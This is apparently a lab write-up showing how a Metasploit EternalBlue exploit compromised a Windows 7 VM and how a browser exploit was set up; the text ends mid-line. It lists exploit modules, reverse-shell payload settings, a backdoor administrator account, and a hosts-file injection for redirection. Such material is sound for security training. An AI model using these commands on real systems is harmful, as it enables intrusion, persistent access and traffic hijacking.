## Metasploit Attack #1 - Eternal Blue

### Objective:
Demonstrated the exploitation of the EternalBlue vulnerability using Metasploit on a Kali Linux virtual machine (VM) to compromise a Windows 7 VM.

### Skills Learned:
- Vulnerability exploitation
- Network scanning and reconnaissance
- Payload configuration
- Post-exploitation tasks
- User privilege escalation
- Using Metasploit and Armitage tools

### Tools Used:
- Kali Linux VM
- Metasploit Framework
- Armitage
- Windows 7 VM
- Windows XP VM
- Ping and networking utilities

### Steps to Execute the Attack:

#### Initial Setup:

1. **Login to Kali VM:**
   - Username: `root`
   - Password: `toor`
   - If the desktop locked due to inactivity, pressed `Enter` and re-entered the password.

   **Explanation:**
   Logged in as root to have the necessary privileges to perform the exploitation tasks.

2. **Open Terminal:**
   - Clicked the terminal icon on the left toolbar (second from the top).

   **Explanation:**
   The terminal was where all commands were executed to interact with the Metasploit framework and perform network diagnostics.

3. **Verify Connectivity:**
   - Ran `ping –c 4 10.1.188.217` to check communication with the Win7 VM.

   ![Ping Command Output](https://via.placeholder.com/600x400.png?text=Ping+Command+Output)

   **Explanation:**
   Ensured network connectivity between the attacker (Kali) and the target (Win7) for the exploitation to work. The ping command output shows successful packet transmission, confirming that the target VM is reachable.

#### Exploit Execution:

4. **Start Metasploit Console:**
   - Navigated to `Application | Exploitation Tools | Metasploit`.

   ![Start Metasploit](https://via.placeholder.com/600x400.png?text=Start+Metasploit)

   **Explanation:**
   Metasploit was the primary tool used to exploit the EternalBlue vulnerability.

5. **Load the EternalBlue Exploit:**
   - Ran `use exploit/windows/smb/ms17_010_eternalblue`.

   ![Load EternalBlue Exploit](https://via.placeholder.com/600x400.png?text=Load+EternalBlue+Exploit)

   **Explanation:**
   This command loaded the EternalBlue exploit module, which targeted the SMB vulnerability on the Windows 7 machine.

6. **Configure Exploit Options:**
   - Ran `show options` to view necessary configurations.
   - Set the target IP address: `set rhost 10.1.188.217`.

   ![Show Options](https://via.placeholder.com/600x400.png?text=Show+Options)

   **Explanation:**
   Specified the IP address of the target machine (RHOST) so that Metasploit knew which machine to attack. This screenshot shows the configuration details of the EternalBlue exploit.

7. **Configure Payload:**
   - Set the payload: `set payload windows/x64/meterpreter/reverse_tcp`.
   - Set the local host IP: `set lhost 10.1.188.184`.
   - Set the local port: `set lport 8888`.

   ![Configure Payload](https://via.placeholder.com/600x400.png?text=Configure+Payload)

   **Explanation:**
   The payload determined the actions performed post-exploit. Reverse TCP meterpreter was chosen to establish a connection back to the attacker’s machine, reducing firewall detection chances.

8. **Verify Configuration:**
   - Ran `show options` again to confirm settings.

   ![Verify Configuration](https://via.placeholder.com/600x400.png?text=Verify+Configuration)

   **Explanation:**
   Re-verified options to ensure that all necessary parameters were correctly set before launching the exploit.

9. **Launch the Exploit:**
   - Ran `exploit`.

   **Explanation:**
   This command initiated the exploit, attempting to leverage the EternalBlue vulnerability to gain control over the target system.

10. **Capture Meterpreter Prompt:**
    - Took a screenshot when the `meterpreter>` prompt appeared.

    ![Meterpreter Prompt](https://via.placeholder.com/600x400.png?text=Meterpreter+Prompt)

    **Explanation:**
    The meterpreter prompt indicated a successful exploitation, providing an interactive shell on the compromised machine. This prompt confirms that the exploit was successful.

#### Post-Exploit Actions:

11. **Gather System Information:**
    - Ran `sysinfo` at the `meterpreter>` prompt.
    - Took a screenshot of the output.

    ![Sysinfo Output](https://via.placeholder.com/600x400.png?text=Sysinfo+Output)

    **Explanation:**
    Gathering system information helped to understand the target environment and confirm successful exploitation. The output displays critical system details such as OS version, architecture, and hostname.

12. **Capture Victim's Desktop:**
    - Ran `screenshot` at the `meterpreter>` prompt.
    - Noted the file name and took a screenshot of the MSF console.

    ![Screenshot Command Output](https://via.placeholder.com/600x400.png?text=Screenshot+Command+Output)

    **Explanation:**
    Capturing the victim’s desktop was a way to visually confirm access and control over the target machine. This screenshot shows the desktop image captured by the meterpreter `screenshot` command.

13. **Create a Shell and Directory:**
    - Ran `shell` at the `meterpreter>` prompt.
    - Executed `cd \` and `mkdir hacked` in the victim's shell.
    - Verified the directory creation in Win7 VM and took a screenshot.

    ![Create Directory](https://via.placeholder.com/600x400.png?text=Create+Directory)

    **Explanation:**
    Creating a new directory demonstrated the ability to execute commands and make changes on the compromised system. The screenshot shows the newly created `hacked` directory in the Win7 VM.

### Post-Exploit Actions:

#### New User Creation:

1. **Add New User:**
   - Ran `net user Your_First_Name Your_Password /add` in the victim's shell.

   ![Add New User](https://via.placeholder.com/600x400.png?text=Add+New+User)

   **Explanation:**
   Adding a new user account on the target system showed the ability to escalate privileges and maintain persistent access. This command creates a new user with the specified username and password.

2. **Add User to Administrators Group:**
   - Ran `net localgroup administrators Your_First_Name /add`.

   ![Add User to Administrators Group](https://via.placeholder.com/600x400.png?text=Add+User+to+Administrators+Group)

   **Explanation:**
   Adding the new user to the administrators group ensured the highest level of access and control over the target system. This command elevates the new user to an administrator role.

3. **Verify in Win7 VM:**
   - Navigated to `Control Panel | User Accounts | Manage another account`.
   - Took a screenshot showing the new user account.

   ![New User Account](https://via.placeholder.com/600x400.png?text=New+User+Account)

   **Explanation:**
   Verifying the new user account in the Windows 7 VM confirmed that the account creation was successful. The screenshot shows the new user account listed in the user accounts management panel.

#### Virtual Machine Check:

1. **Detect VM:**
   - Ran `run post/windows/gather/checkvm` at the `meterpreter>` prompt.
   - Took a screenshot of the output.

   ![VM Detection](https://via.placeholder.com/600x400.png?text=VM+Detection)

   **Explanation:**
   Detecting if the target was a virtual machine provided insights for further attack strategies and evasion techniques. The output indicates whether the target is running in a virtual environment.

2. **Inject Host Entry:**
   - Ran `run post/windows/manage/inject_host domain=cob.unt.edu ip=10.1.188.184`.

   **Explanation:**
   Modifying the hosts file redirected network traffic, which could be used for further exploitation or phishing attacks.

3. **Verify Host File Entry:**
   - Opened `C:\Windows\System32\drivers\etc\hosts` in Win7 VM.
   - Took a screenshot of the updated hosts file.

   ![Hosts File](https://via.placeholder.com/600x400.png?text=Hosts+File)

   **Explanation:**
   Verifying the hosts file modification confirmed the ability to alter critical system files on the target. The screenshot shows the `hosts` file with the newly added entry.

### IE CSS Import Attack:

1. **Load Exploit:**
   - Ran `use exploit/windows/browser/ms11_003_ie_css_import`.

   ![Load CSS Import Exploit](https://via.placeholder.com/600x400.png?text=Load+CSS+Import+Exploit)

   **Explanation:**
   Loading a different exploit module demonstrated versatility in attack strategies. This module targets a specific Internet Explorer vulnerability.

2. **Configure Exploit Options:**
   - Set the payload: `set payload windows/meterpreter/reverse_tcp`.
   - Set the local port: `set srvport 80`.
   - Set the URI path: `set uripath /itds`.
   - Set the local host IP: `set lhost 10.1.188.184`.

   ![Configure CSS Import Exploit](https://via
